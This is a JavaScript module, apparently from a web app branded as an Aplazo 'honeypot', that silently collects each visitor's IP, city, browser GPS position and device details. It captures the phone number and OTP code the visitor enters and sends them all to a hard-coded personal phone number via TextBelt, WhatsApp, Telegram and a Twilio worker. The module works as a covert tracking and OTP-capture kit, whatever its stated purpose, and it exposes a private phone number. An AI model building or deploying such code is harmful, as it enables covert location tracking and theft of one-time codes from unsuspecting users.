// ════════════════════════════════════════════════════════════
//  APLAZO HONEYPOT — Sistema de Alerta y Captura
//  Canales activos:
//    ✅ SMS gratuito  — TextBelt (sin cuenta, 1/día de prueba)
//    ✅ WhatsApp      — CallMeBot (activar desde el teléfono)
//    ✅ Telegram      — solo falta el token completo de BotFather
// ════════════════════════════════════════════════════════════

// ─── Número de alerta (teléfono dedicado del equipo Aplazo) ──
const ALERT_PHONE_MX = '+527223570615'   // 722 357 0615 con lada MX

// ─── Configuración desde .env (opcional, mejora el servicio) ──
const CFG = {
  // WhatsApp CallMeBot — activar desde el teléfono +527223570615:
  //   Mandar "I allow callmebot to send me messages" a +34 644 597 104
  WA_APIKEY:  import.meta.env.VITE_WA_APIKEY  || '',

  // Telegram — pegar token COMPLETO de @BotFather (formato: 1234567:AAABBB...)
  TG_TOKEN:   import.meta.env.VITE_TG_TOKEN   || '',
  TG_CHAT:    import.meta.env.VITE_TG_CHAT    || '',

  // SMS Twilio vía Worker (opcional, para SMS ilimitados)
  SMS_WORKER: import.meta.env.VITE_SMS_WORKER || '',
}

// ─── Estado de sesión del intruso ───────────────────────────
let session = {
  telefono: '',
  otp:      '',
  ip:       '',
  ciudad:   '',
  pais:     '',
  lat:      null,
  lon:      null,
  ua:       navigator.userAgent,
  hora:     '',
  enviado:  false,
}

// ─── Detectar IP + ubicación aproximada (sin pedir permiso) ──
async function detectarIP() {
  try {
    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' })
    const d = await r.json()
    session.ip     = d.ip             || '?'
    session.ciudad = d.city           || '?'
    session.pais   = d.country_name   || '?'
    if (!session.lat) session.lat = d.latitude
    if (!session.lon) session.lon = d.longitude
  } catch {
    try {
      const r2 = await fetch('https://api.ipify.org?format=json')
      const d2 = await r2.json()
      session.ip = d2.ip || 'desconocida'
    } catch { session.ip = 'desconocida' }
  }
}

// ─── Pedir GPS al navegador (silencioso si niegan) ───────────
function pedirGPS() {
  if (!navigator.geolocation) return
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      session.lat = pos.coords.latitude
      session.lon = pos.coords.longitude
    },
    () => {},
    { timeout: 8000, maximumAge: 0 }
  )
}

// ─── Parsear dispositivo / navegador ─────────────────────────
function parsearDispositivo() {
  const ua = session.ua
  let dev = 'Desconocido', nav = 'Desconocido'
  if      (/iPhone/.test(ua))  dev = 'iPhone'
  else if (/iPad/.test(ua))    dev = 'iPad'
  else if (/Android/.test(ua)) dev = 'Android'
  else if (/Windows/.test(ua)) dev = 'Windows PC'
  else if (/Mac/.test(ua))     dev = 'Mac'
  if      (/Chrome\//.test(ua) && !/Edge\//.test(ua)) nav = 'Chrome'
  else if (/Firefox\//.test(ua))                       nav = 'Firefox'
  else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) nav = 'Safari'
  else if (/Edge\//.test(ua))                          nav = 'Edge'
  return `${dev} / ${nav}`
}

// ─── Construir mensaje de alerta ────────────────────────────
function construirMensaje(corto = false) {
  const mapLink = (session.lat && session.lon)
    ? `https://maps.google.com/?q=${session.lat},${session.lon}`
    : 'sin GPS'

  if (corto) {
    // Versión corta para SMS (160 chars)
    return `🚨 APLAZO HONEYPOT\nTel: ${session.telefono}\nOTP: ${session.otp || '-'}\nIP: ${session.ip} (${session.ciudad})\nMapa: ${mapLink}`
  }

  return [
    '🚨 HONEYPOT ACTIVADO — APLAZO',
    '━━━━━━━━━━━━━━━━━━━━━━',
    `📱 Teléfono intruso: ${session.telefono || '(no ingresado)'}`,
    `🔢 OTP intentado: ${session.otp || '(aún no)'}`,
    '━━━━━━━━━━━━━━━━━━━━━━',
    `🌐 IP: ${session.ip}`,
    `🏙️ Ubicación: ${session.ciudad}, ${session.pais}`,
    `📍 GPS: ${mapLink}`,
    `🖥️ Dispositivo: ${parsearDispositivo()}`,
    `⏰ ${session.hora}`,
  ].join('\n')
}

// ════════════════════════════════════════════════════════════
//  CANAL 1 — SMS gratuito vía TextBelt
//  • No requiere cuenta ni API key
//  • Límite: 1 SMS gratis por día (suficiente para honeypot)
//  • Para SMS ilimitados: comprar key en textbelt.com ($10)
// ════════════════════════════════════════════════════════════
async function enviarSMSTextBelt(mensaje) {
  try {
    await fetch('https://textbelt.com/text', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone:   ALERT_PHONE_MX,
        message: mensaje,
        key:     'textbelt',       // clave gratis (1 SMS/día)
      }),
    })
  } catch { /* silencioso */ }
}

// ════════════════════════════════════════════════════════════
//  CANAL 2 — WhatsApp vía CallMeBot (gratis, ilimitado)
//  ACTIVAR: desde +527223570615 mandar a +34 644 597 104:
//           "I allow callmebot to send me messages"
//  Luego copiar el API key a .env como VITE_WA_APIKEY
// ════════════════════════════════════════════════════════════
async function enviarWhatsApp(mensaje) {
  if (!CFG.WA_APIKEY) return
  try {
    const url = `https://api.callmebot.com/whatsapp.php`
      + `?phone=${ALERT_PHONE_MX}`
      + `&text=${encodeURIComponent(mensaje)}`
      + `&apikey=${CFG.WA_APIKEY}`
    await fetch(url, { mode: 'no-cors' })
  } catch { /* silencioso */ }
}

// ════════════════════════════════════════════════════════════
//  CANAL 3 — Telegram (gratis, ilimitado)
//  1. Ir a @BotFather → /mybots → tu bot → "API Token"
//     (copiar el número completo, incluye los dígitos antes del ":")
//  2. Desde el teléfono 7223570615 abrir el bot y mandar "hola"
//  3. Abrir: https://api.telegram.org/botTOKEN/getUpdates
//     y copiar el "id" del chat
//  4. Poner ambos en .env como VITE_TG_TOKEN y VITE_TG_CHAT
// ════════════════════════════════════════════════════════════
async function enviarTelegram(mensaje) {
  if (!CFG.TG_TOKEN || !CFG.TG_CHAT) return
  try {
    await fetch(`https://api.telegram.org/bot${CFG.TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id:    CFG.TG_CHAT,
        text:       mensaje,
        parse_mode: 'HTML',
      }),
    })
  } catch { /* silencioso */ }
}

// ════════════════════════════════════════════════════════════
//  CANAL 4 — SMS Twilio vía Worker (ilimitado, trial gratis)
//  Solo si se configuró el Worker de Cloudflare
// ════════════════════════════════════════════════════════════
async function enviarSMSTwilio(mensaje) {
  if (!CFG.SMS_WORKER) return
  try {
    await fetch(CFG.SMS_WORKER, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mensaje, sesion: session }),
    })
  } catch { /* silencioso */ }
}

// ─── Disparar todos los canales ──────────────────────────────
async function dispararAlerta() {
  if (session.enviado) return
  session.enviado = true
  session.hora = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })

  await detectarIP()

  const msgLargo = construirMensaje(false)
  const msgCorto = construirMensaje(true)

  await Promise.allSettled([
    enviarSMSTextBelt(msgCorto),   // SMS gratis — activo YA
    enviarWhatsApp(msgLargo),      // WhatsApp — activo al dar VITE_WA_APIKEY
    enviarTelegram(msgLargo),      // Telegram  — activo al dar token completo
    enviarSMSTwilio(msgCorto),     // Twilio    — activo al configurar Worker
  ])
}

// ════════════════════════════════════════════════════════════
//  API pública
// ════════════════════════════════════════════════════════════

/** Iniciar detección silenciosa al cargar la app */
export function iniciarHoneypot() {
  detectarIP()
  pedirGPS()
}

/** Capturar teléfono cuando el intruso lo confirma */
export function capturarTelefono(numero) {
  session.telefono = numero
  session.enviado  = false
  dispararAlerta()
}

/** Capturar OTP cuando el intruso lo intenta verificar */
export function capturarOTP(codigo) {
  session.otp     = codigo
  session.enviado = false
  dispararAlerta()
}
